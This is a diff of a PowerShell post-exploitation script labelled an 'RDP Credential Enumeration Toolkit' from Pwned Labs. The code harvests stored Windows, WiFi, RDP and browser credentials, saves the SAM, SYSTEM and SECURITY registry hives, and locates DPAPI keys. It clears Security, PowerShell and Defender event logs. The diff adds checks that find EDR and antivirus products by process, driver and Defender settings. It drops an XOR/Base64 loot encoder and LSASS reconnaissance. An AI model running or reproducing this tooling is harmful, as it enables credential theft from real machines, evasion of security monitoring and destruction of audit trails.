@@ -11,20 +11,6 @@ function Invoke-PrivilegeEscalation {
     }
 }
 
-function xor-encode {
-    param (
-        [string]$Path,
-        [byte]$Key = 0x42
-    )
-    if (-not (Test-Path $Path)) { return }
-    $bytes = [System.IO.File]::ReadAllBytes($Path)
-    for($i = 0; $i -lt $bytes.Length; $i++) {
-        $bytes[$i] = $bytes[$i] -bxor $Key
-    }
-    [Convert]::ToBase64String($bytes) | Out-File "$Path.xor64" -Encoding ascii
-    Remove-Item $Path -Force -ErrorAction SilentlyContinue
-}
-
 function Clear-CommonLogs {
     $logsToClear = @("Security", "System", "Application", "Microsoft-Windows-PowerShell/Operational", "Microsoft-Windows-Windows Defender/Operational")
     foreach ($log in $logsToClear) {
@@ -46,10 +32,12 @@ function Func-CredManager {
         $credList = @()
         $creds | ForEach-Object {
             try { $_.RetrievePassword() } catch {}
-            $credList += [PSCustomObject]@{
-                Resource = $_.Resource
-                UserName = $_.UserName
-                Password = $_.Password
+            if ($_.Password) {
+                $credList += [PSCustomObject]@{
+                    Resource = $_.Resource
+                    UserName = $_.UserName
+                    Password = $_.Password
+                }
             }
         }
         if ($credList.Count -gt 0) {
@@ -61,7 +49,6 @@ function Func-CredManager {
 
 function Func-CmdKey {
     $out = cmdkey /list
-    $out | Out-File "$outputDir\cmdkey.txt" -Encoding ascii
     $parsed = @()
     $current = @{}
     foreach ($line in $out) {
@@ -69,7 +56,10 @@ function Func-CmdKey {
         if ($line -match "^Type:\s*(.+)$")   { $current.Type   = $matches[1].Trim() }
         if ($line -match "^User:\s*(.+)$")   { $current.User   = $matches[1].Trim() }
         if ($line.Trim() -eq "") {
-            if ($current.Count -gt 0) { $parsed += [PSCustomObject]$current; $current = @{} }
+            if ($current.Count -gt 0 -and $current.User) {
+                $parsed += [PSCustomObject]$current
+            }
+            $current = @{}
         }
     }
     if ($parsed.Count -gt 0) {
@@ -91,17 +81,17 @@ function Func-WiFi {
     }
     if ($wifiList.Count -gt 0) {
         $wifiList | ConvertTo-Json -Depth 4 | Out-File "$outputDir\wifi.json" -Encoding utf8
-        $wifiList | Export-Csv "$outputDir\wifi.csv" -NoTypeInformation -Encoding utf8
     }
 }
 
 function Func-RDP {
     $blobs = Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials","$env:LOCALAPPDATA\Microsoft\Credentials" -Recurse -File -ErrorAction SilentlyContinue |
         Select FullName, Length, LastWriteTime, @{Name="Computer";Expression={$env:COMPUTERNAME}}
-    $blobs | ConvertTo-Json -Depth 4 | Out-File "$outputDir\rdp_cred_blobs.json" -Encoding utf8
-    $blobs | Export-Csv "$outputDir\rdp_cred_blobs.csv" -NoTypeInformation
-    reg query "HKCU\Software\Microsoft\Terminal Server Client\Default" /s 2>$null | Out-File "$outputDir\rdp_default.reg.txt"
-    reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s 2>$null | Out-File "$outputDir\rdp_servers.reg.txt"
+    if ($blobs) {
+        $blobs | ConvertTo-Json -Depth 4 | Out-File "$outputDir\rdp_cred_blobs.json" -Encoding utf8
+    }
+    reg query "HKCU\Software\Microsoft\Terminal Server Client\Default" /s 2>$null | Out-File "$outputDir\rdp_default.reg.txt" -Encoding ascii
+    reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s 2>$null | Out-File "$outputDir\rdp_servers.reg.txt" -Encoding ascii
 }
 
 function Func-Browsers {
@@ -131,11 +121,6 @@ function Func-LAPS {
     } catch {}
 }
 
-function Func-IE {
-    reg query "HKCU\Software\Microsoft\Internet Explorer\IntelliForms\Storage2" /s 2>$null | Out-File "$outputDir\ie_intelliforms.reg.txt"
-    reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers" /s 2>$null | Out-File "$outputDir\cred_providers.reg.txt"
-}
-
 function Func-Unattended {
     Get-ChildItem -Path "C:\","C:\Windows\Panther","C:\Windows\System32\sysprep" -Recurse -Include *.xml,*.txt,unattend*,sysprep* -ErrorAction SilentlyContinue |
         Where-Object { $_.Length -lt 1MB -and $_.Length -gt 0 } |
@@ -144,18 +129,9 @@ function Func-Unattended {
         }
 }
 
-function Func-Recent {
-    $recent = Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Recurse -ErrorAction SilentlyContinue |
-        Select FullName, LastWriteTime, Length
-    $recent | ConvertTo-Json -Depth 4 | Out-File "$outputDir\recent_files.json" -Encoding utf8
-    $recent | Export-Csv "$outputDir\recent_files.csv" -NoTypeInformation
-    reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /s 2>$null | Out-File "$outputDir\runmru.txt"
-    Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" "$outputDir\powershell_history.txt" -ErrorAction SilentlyContinue
-}
-
 function Func-Hives {
-    reg save HKLM\SAM     "$outputDir\sam.hive"     2>$null
-    reg save HKLM\SYSTEM  "$outputDir\system.hive"  2>$null
+    reg save HKLM\SAM "$outputDir\sam.hive" 2>$null
+    reg save HKLM\SYSTEM "$outputDir\system.hive" 2>$null
     reg save HKLM\SECURITY "$outputDir\security.hive" 2>$null
 }
 
@@ -167,14 +143,6 @@ function Func-Dpapi {
         Out-File "$outputDir\dpapi_masterkeys.json" -Encoding utf8
 }
 
-function Func-LsassDumpHint {
-    Get-Process -Name lsass -ErrorAction SilentlyContinue |
-        Select Id, StartTime, Path, @{Name="Session";Expression={$_.SessionId}} |
-        ConvertTo-Json -Depth 3 |
-        Out-File "$outputDir\lsass_process.json" -Encoding utf8
-    Get-Service -Name seclogon -ErrorAction SilentlyContinue | Select Name, Status, StartType | ConvertTo-Json | Out-File "$outputDir\seclogon.json" -Encoding utf8
-}
-
 function Func-ScheduledTasksCreds {
     Get-ScheduledTask | Where-Object { $_.Principal.UserId -or $_.Principal.LogonType -eq "Password" } |
         Select TaskName, TaskPath, Principal, @{Name="User";Expression={$_.Principal.UserId}}, @{Name="LogonType";Expression={$_.Principal.LogonType}} |
@@ -182,126 +150,130 @@ function Func-ScheduledTasksCreds {
         Out-File "$outputDir\scheduled_tasks_creds.json" -Encoding utf8
 }
 
-function Func-RDPThiefArtifacts {
-    Get-ChildItem -Path "C:\Windows\Temp","C:\Users\*\AppData\Local\Temp" -Recurse -Include *rdp*,*mstsc*,*termsrv* -ErrorAction SilentlyContinue |
-        Select FullName, Length, LastWriteTime |
-        ConvertTo-Json -Depth 4 |
-        Out-File "$outputDir\rdp_temp_artifacts.json" -Encoding utf8
+function Func-CheckAV {
+    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue |
+        Select-Object displayName, productState, timestamp |
+        ConvertTo-Json -Depth 3 |
+        Out-File "$outputDir\installed_antivirus.json" -Encoding utf8
 }
 
-function Func-Winlogon {
-    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /s 2>$null |
-        Out-File "$outputDir\winlogon.reg.txt"
+function Func-EDRProcesses {
+    $edrPatterns = @("*crowdstrike*","*csagent*","*falcon*","*csfalcon*","*sentinelone*","*sentinel*","*sed*","*sophos*","*carbonblack*","*cbdefense*","*confer*","*cortex*","*xdr*","*trap*","*defender*","*msmpeng*","*sense*","*wdnisdrv*","*elastic*","*endpoint*","*harfanglab*","*morphisec*","*cylance*","*fireeye*","*tanium*")
+    $processes = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -and ($edrPatterns | Where-Object { $_.Path -like $_ }) }
+    $services = Get-Service -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName -match ($edrPatterns -join "|") -or $_.Name -match ($edrPatterns -join "|") }
+    $result = [PSCustomObject]@{
+        SuspiciousProcesses = $processes | Select Id,Name,Path,Company,StartTime
+        SuspiciousServices  = $services  | Select Name,DisplayName,Status,StartType
+    }
+    $result | ConvertTo-Json -Depth 5 | Out-File "$outputDir\edr_av_processes_services.json" -Encoding utf8
+}
+
+function Func-EDRDrivers {
+    $drivers = Get-WmiObject Win32_SystemDriver |
+        Where-Object { $_.DisplayName -match "carbonblack|crowdstrike|sentinel|falcon|elastic|harfang|cortex|xdr|tanium|morphisec|cylance|fireeye|sophos" } |
+        Select Name, DisplayName, State, PathName
+    if ($drivers) {
+        $drivers | ConvertTo-Json -Depth 3 | Out-File "$outputDir\edr_drivers.json" -Encoding utf8
+    }
+}
+
+function Func-DefenderStatus {
+    $defender = @{}
+    try {
+        $defender["RealTimeProtection"] = (Get-MpPreference).DisableRealtimeMonitoring -eq $false
+        $defender["BehaviorMonitoring"] = -not (Get-MpPreference).DisableBehaviorMonitoring
+        $defender["IOAVProtection"]     = -not (Get-MpPreference).DisableIOAVProtection
+        $defender["ScriptScanning"]     = -not (Get-MpPreference).DisableScriptScanning
+        $defender["ControlledFolderAccess"] = (Get-MpPreference).EnableControlledFolderAccess -ne 0
+        $defender["TamperProtection"]   = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -ErrorAction SilentlyContinue
+    } catch {}
+    try {
+        $defender["LastQuickScan"] = (Get-MpComputerStatus).LastQuickScanTime
+        $defender["LastFullScan"]  = (Get-MpComputerStatus).LastFullScanTime
+        $defender["AntivirusEnabled"] = (Get-MpComputerStatus).AntivirusEnabled
+        $defender["AMServiceEnabled"] = (Get-MpComputerStatus).AMServiceEnabled
+    } catch {}
+    $defender | ConvertTo-Json -Depth 4 | Out-File "$outputDir\defender_status.json" -Encoding utf8
+}
+
+function Func-SecurityProcesses {
+    Get-Process -ErrorAction SilentlyContinue |
+        Where-Object { $_.Path -match "msmpeng|MsMpEng|Sense|WdNisDrv|csagent|falcon|sentinel|Cortex|XDR|S1Agent|Elastic|Harfang|Morphisec|Cylance|FireEye|Tanium|Sophos" } |
+        Select Id,Name,Path,Company,StartTime,SessionId |
+        ConvertTo-Json -Depth 4 |
+        Out-File "$outputDir\security_related_processes.json" -Encoding utf8
 }
 
 function Show-Menu {
     Clear-Host
     Write-Host @"
-╔═══════════════════════════════════════════════════════════════════════════╗
-║ RDP Credential Enumeration Toolkit - 2026 ║
-║ Pwned Labs | @maverickx64 ║
-╚═══════════════════════════════════════════════════════════════════════════╝
+╔══════════════════════════════════════════════════════╗
+║     RDP Credential Enumeration Toolkit - 2026        ║
+║             Pwned Labs | @maverickx64                ║
+╚══════════════════════════════════════════════════════╝
 "@ -ForegroundColor Cyan
-    Write-Host "Select an option:" -ForegroundColor Yellow
+
     Write-Host " 1. Windows Credential Manager"
-    Write-Host " 2. cmdkey / network credentials"
-    Write-Host " 3. WiFi Passwords"
-    Write-Host " 4. RDP Credentials & servers"
-    Write-Host " 5. Browser Passwords (files)"
-    Write-Host " 6. LAPS Password"
-    Write-Host " 7. IE / Legacy Edge / Cred Providers"
-    Write-Host " 8. Unattended & Sysprep Files"
-    Write-Host " 9. Recent Files & PowerShell History"
-    Write-Host "10. SAM / SYSTEM / SECURITY Hives"
-    Write-Host "11. Clear common event logs"
-    Write-Host "12. DPAPI master key locations"
-    Write-Host "13. LSASS process & seclogon status"
-    Write-Host "14. Scheduled Tasks with stored creds"
-    Write-Host "15. RDP-related temp artifacts"
-    Write-Host "16. Winlogon registry keys"
-    Write-Host " A. Run All Enumeration"
-    Write-Host " B. Run All + Clear Logs"
-    Write-Host " E. Encode all loot (XOR + Base64)"
+    Write-Host " 2. cmdkey / saved network credentials"
+    Write-Host " 3. WiFi Profiles + Passwords"
+    Write-Host " 4. RDP saved credentials & servers"
+    Write-Host " 5. Browser password files (Chrome/Edge/Firefox)"
+    Write-Host " 6. LAPS local admin password (if domain)"
+    Write-Host " 7. Unattended/Sysprep files"
+    Write-Host " 8. SAM / SYSTEM / SECURITY hives"
+    Write-Host " 9. DPAPI master key locations"
+    Write-Host "10. Scheduled Tasks with stored credentials"
+    Write-Host ""
+    Write-Host "Security / EDR detection:"
+    Write-Host "11. Check installed AV / Security Products"
+    Write-Host "12. Quick EDR / AV process & service detection"
+    Write-Host "13. Most common EDR driver & service names"
+    Write-Host "14. Check Defender status + real-time protection"
+    Write-Host "15. List security-related running processes"
+    Write-Host ""
+    Write-Host " C. Clear common event logs"
     Write-Host " 0. Exit"
+    Write-Host ""
     $choice = Read-Host "Enter choice"
     return $choice
 }
 
 $outputDir = "$env:USERPROFILE\Desktop\Loot_$(Get-Date -Format 'yyyy-MM-dd_HHmm')"
 New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
-Write-Host "[+] Loot directory: $outputDir`n" -ForegroundColor Green
+Write-Host "[+] Output directory: $outputDir`n" -ForegroundColor Green
 
 Invoke-PrivilegeEscalation
 
 do {
     $choice = Show-Menu
-    switch ($choice.ToUpper()) {
+    switch ($choice) {
         '1'  { Func-CredManager }
         '2'  { Func-CmdKey }
         '3'  { Func-WiFi }
         '4'  { Func-RDP }
         '5'  { Func-Browsers }
         '6'  { Func-LAPS }
-        '7'  { Func-IE }
-        '8'  { Func-Unattended }
-        '9'  { Func-Recent }
-        '10' { Func-Hives }
-        '11' { Clear-CommonLogs }
-        '12' { Func-Dpapi }
-        '13' { Func-LsassDumpHint }
-        '14' { Func-ScheduledTasksCreds }
-        '15' { Func-RDPThiefArtifacts }
-        '16' { Func-Winlogon }
-        'A'  {
-            Func-CredManager
-            Func-CmdKey
-            Func-WiFi
-            Func-RDP
-            Func-Browsers
-            Func-LAPS
-            Func-IE
-            Func-Unattended
-            Func-Recent
-            Func-Hives
-            Func-Dpapi
-            Func-LsassDumpHint
-            Func-ScheduledTasksCreds
-            Func-RDPThiefArtifacts
-            Func-Winlogon
-        }
-        'B'  {
-            Func-CredManager
-            Func-CmdKey
-            Func-WiFi
-            Func-RDP
-            Func-Browsers
-            Func-LAPS
-            Func-IE
-            Func-Unattended
-            Func-Recent
-            Func-Hives
-            Func-Dpapi
-            Func-LsassDumpHint
-            Func-ScheduledTasksCreds
-            Func-RDPThiefArtifacts
-            Func-Winlogon
-            Clear-CommonLogs
-        }
-        'E'  {
-            Get-ChildItem $outputDir -File | ForEach-Object {
-                xor-encode $_.FullName
-            }
-        }
+        '7'  { Func-Unattended }
+        '8'  { Func-Hives }
+        '9'  { Func-Dpapi }
+        '10' { Func-ScheduledTasksCreds }
+        '11' { Func-CheckAV }
+        '12' { Func-EDRProcesses }
+        '13' { Func-EDRDrivers }
+        '14' { Func-DefenderStatus }
+        '15' { Func-SecurityProcesses }
+        'C'  { Clear-CommonLogs; Write-Host "[+] Common logs cleared" -ForegroundColor Green }
         '0'  { break }
     }
     if ($choice -ne '0') {
+        Write-Host "`nPress any key to continue..." -ForegroundColor Gray
         $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
     }
 } while ($choice -ne '0')
 
 Write-Host @"
 Finished.
-Loot saved in: $outputDir
-Use 'E' to XOR-encode + Base64 all files
+Results saved to: $outputDir
+
 Pwned Labs | @maverickx64
 "@ -ForegroundColor Cyan
